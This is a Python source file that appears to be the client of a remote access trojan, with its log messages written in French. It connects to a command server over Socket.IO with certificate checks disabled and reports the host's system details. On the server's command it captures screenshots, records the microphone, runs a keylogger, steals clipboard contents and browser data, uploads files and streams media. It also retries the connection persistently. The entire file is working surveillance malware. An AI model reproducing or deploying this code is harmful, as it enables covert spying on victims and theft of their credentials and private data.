import json
import platform
import threading
import time

import socketio

from client.database_utils import send_browser_data
from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
    start_stream as start_media_stream, stop_stream as stop_media_stream, get_clipboard_content, list_dir

sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)


def log_event(message):
    print(message)


@sio.event
def connect():
    log_event("Connection réussie")
    sio.emit('system_info', {'os': platform.system(), 'os_version': platform.version(), 'hostname': platform.node()})


@sio.event
def connect_error(data):
    log_event(f"Connection échouée: {data}")


@sio.event
def disconnect():
    log_event("Connection perdue")


@sio.event
def command(data):
    command = data.get('command')
    user_id = data.get('user_id')
    params = data.get('params', {})
    duration = 0
    file_path = ""

    if isinstance(params, str):
        try:
            params = json.loads(params)
        except json.JSONDecodeError:
            print("Erreur de décodage JSON pour les paramètres:", params)
            return

    if isinstance(params, dict):
        if 'duration' in params:
            duration = int(params.get('duration', 10))
        if 'file_path' in params:
            file_path = params.get('file_path')
    else:
        duration = int(params)

    if command == 'screenshot':
        take_and_send_screenshot(sio, user_id)
    elif command == 'microphone':
        record_and_send_audio(sio, duration, user_id)
    elif command == 'keylogger':
        record_and_send_keyboard_log(sio, duration, user_id)
    elif command == 'clipboard':
        get_clipboard_content(sio, user_id)
    elif command == 'downloadfile':
        download_file(sio, file_path, user_id)
    elif command == 'listdir':
        list_dir(sio, file_path)
    elif command == 'browserdata':
        send_browser_data(sio, user_id)


@sio.event
def start_stream(data):
    user_id = data.get('user_id')
    threading.Thread(target=start_media_stream, args=(sio, user_id)).start()


@sio.event
def stop_stream(data):
    user_id = data.get('user_id')
    stop_media_stream(user_id)


@sio.event
def list_directory(data):
    directory = data.get('dir_path')
    list_dir(sio, directory)


def attempt_reconnect(server_url):
    while not sio.connected:
        try:
            log_event("Tentative de reconnexion...")
            sio.connect(server_url, transports=['websocket', 'polling'], namespaces=['/'])
            time.sleep(5)
        except socketio.exceptions.ConnectionError as e:
            log_event("Echec de la reconnexion. Nouvelle tentative dans 5 secondes...")
            time.sleep(5)


def start_client(server_url):
    attempt_reconnect(server_url)
    sio.wait()
